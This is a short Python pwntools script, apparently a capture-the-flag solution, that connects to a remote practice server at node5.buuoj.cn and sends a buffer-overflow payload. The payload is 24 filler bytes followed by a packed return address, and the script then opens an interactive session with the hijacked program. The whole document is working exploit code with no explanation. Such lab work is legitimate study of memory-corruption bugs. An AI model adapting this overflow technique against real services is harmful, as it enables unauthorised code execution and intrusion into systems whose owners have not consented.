from  pwn import *
sh = remote('node5.buuoj.cn', 26516)
buff_addr = 0x08048F0D
sh.sendline(b'I'*20+b'a'*4+p32(buff_addr))
sh.interactive()